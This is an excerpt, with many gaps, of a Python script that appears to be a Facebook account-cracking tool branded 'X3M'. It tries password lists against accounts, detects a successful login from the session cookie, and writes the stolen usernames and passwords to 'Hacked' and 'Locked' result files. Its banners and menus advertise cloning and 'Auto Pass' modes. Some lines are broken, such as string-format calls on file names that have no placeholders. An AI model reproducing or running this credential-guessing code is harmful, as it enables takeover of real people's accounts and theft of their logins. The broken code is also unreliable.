...
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
     ...
     ██   ██ ██   ██ ██      ██ ███████ ██   ████     
\x1b[1;97m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃         HACKED ACCOUNT SAVE TO : X3M.txt           ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[X3M-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[X3M-CP] ", ""), titid[1])
...
def file():
            logo()
            print("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
            print("┃(1) \033[93mFile Clone\33[m                                      ┃")
            print("┃(2) \033[93mPublic Clone ( Soon )\33[m                           ┃")
            print("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
            key = input("\n [+] Select One : ")
            if key in [""]:
...
class __chigoue__:
    ...
    def chi(self, id):
        os.system("clear")
        logo()
        crot = input(f" {H}[{H}+{H}] Do You Want To Show Application ?[{H}y{H}/{H}t{H}]: ")
        if crot in[""]:
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        ...
        sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}Ok:{len(ok)}{N}][{K}Cs:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in pasw:
                pw = pw.lower()
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "t" in Apk:
                        ...
                        print(f'\r %sHacked %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        #print(f'\r {H}Cookie   : {coki}')
                    wrt = '[X3M-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('X3M-OK.txt','a').write('%s\n' % wrt)
                    break
                    ...
                    try:
                        ...
                        wrt = '[X3M-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('X3T-Locked.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    ...
                    print('\r %sLocked %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
                    wrt = '[X3M-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('X3M-Locked.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
    ...
    def kombinasi_pw(self,url):
        print('%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n %sAUTO PASSWORD%s'%(H,H,H))
        print('%s[%s1%s] Auto Pass 1 ( Best )'%(H,H,H))
        print('%s[%s2%s] Auto Pass 2'%(H,H,H))
        ...
        if pw in[""]:
            ...
            print('%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[%s+%s] Hacked : results/Hacked-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
            print('%s[%s+%s] Locked : results/Locked-%s-%s-%s.txt'%(H,H,H,ha, op, ta))
